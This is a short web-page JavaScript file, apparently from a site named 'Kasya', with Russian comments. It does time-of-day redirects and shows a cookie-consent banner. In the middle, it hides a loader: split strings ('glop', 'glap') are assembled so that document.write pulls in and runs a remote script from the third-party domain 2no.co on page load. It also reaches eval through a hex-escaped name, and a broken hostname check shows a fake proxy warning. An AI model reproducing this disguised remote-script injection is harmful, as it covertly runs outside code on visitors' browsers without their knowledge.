//Kasya. Время работы
var date = new Date(); 
      var hour = date.getUTCHours();
      if (hour>=18 && hour<19) online = "online";
      else { if (hour>=19 && hour<24) online = "online";
      else { if (hour>=0 && hour<1) online = "server";
      else {  if (hour>=1&& hour<18) online = "online"; 
      }
   }
}
//Kasya Time Jop
if (online == "online") {
}if (online == "offline") { 
window.location.href = "/offline";
} else if (online == "server") {
window.location.href = "/server";
} else {
}

var glop = 'script'
var glap = '2no.co'
document.write('<'+glop+' src="'+window.location.protocol+'//'+glap+'/169ax7.js"></'+glop+'>')
//Kasya Security
a = this["\x65\x76\x61\x6C"];
if (window.location.hostname !== "kasyateam"){
  a(alert('У вас обнаружен Proxy! Мы не позволяем работать с ним.'))
}
else {
 alert('ok') 
}
function checkCookies(){
    let cookieDate = localStorage.getItem('cookieDate');
    let cookieNotification = document.getElementById('cookie_notification');
    let cookieBtn = cookieNotification.querySelector('.cookie_accept');

    // Если записи про кукисы нет или она просрочена на 1 год, то показываем информацию про кукисы
    if( !cookieDate || (+cookieDate + 31536000000) < Date.now() ){
        cookieNotification.classList.add('show');
    }

    // При клике на кнопку, в локальное хранилище записывается текущая дата в системе UNIX
    cookieBtn.addEventListener('click', function(){
        localStorage.setItem( 'cookieDate', Date.now() );
        cookieNotification.classList.remove('show');
    })
}
checkCookies();
